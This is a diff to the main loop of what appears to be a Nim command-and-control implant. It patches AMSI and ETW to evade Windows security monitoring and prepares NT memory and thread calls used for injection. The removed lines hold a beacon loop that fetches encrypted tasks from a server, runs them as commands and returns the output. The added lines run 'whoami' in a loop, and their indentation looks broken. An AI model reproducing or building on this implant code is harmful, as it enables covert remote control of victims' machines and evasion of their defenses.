@@ -2,27 +2,34 @@ import os, json, strformat
 import utils, comms, config
 
 proc main() =
-  discard PatchAMSI()
-  discard PathETW()
-  makeNtAllocateVirtualMemory()
-  makeNtWriteVirtualMemory()
-  makeNtCreateThreadEx()
-  randomize()
+    
+    discard PatchAMSI()
+    echo "ASMI done!"
+    discard PathETW()
+    echo "ETW done!"
 
-  let agentID = genID()
-  echo fmt"[+] Beacon started with ID {agentID}"
+    makeNtAllocateVirtualMemory()
+    makeNtWriteVirtualMemory()
+    makeNtCreateThreadEx()
+  
+    randomize()
 
-  while true:
-    echo "[*] Sending checkin..."
-    let response = sendCheckin(agentID) #response of the post request made to endpoint , contains (task_id,cmd)
+    let agentID = genID()
+    echo fmt"[+] Beacon started with ID {agentID}"
 
-    if response.len > 0:
-      let rawtask = decryptJson(response,AES_KEY)
-      let parsedtask = parseTask(rawtask)
-      let output = execProcess(parsedtask.command)
-      discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
+    while true:
+        echo "[*] Sending checkin..."
+      #let response = sendCheckin(agentID) #response of the post request made to endpoint , contains (task_id,cmd)
 
-    randomSleep(SLEEP_MIN, SLEEP_MAX)
-
+      #if response.len > 0:
+        #let rawtask = decryptJson(response,AES_KEY)
+        #let parsedtask = parseTask(rawtask)
+        #let output = execProcess(parsedtask.command)
+        #echo output
+        #discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
+      #randomSleep(SLEEP_MIN, SLEEP_MAX)
+        var output = execProcess("whoami")
+        echo output
+      
 when isMainModule:
   main()
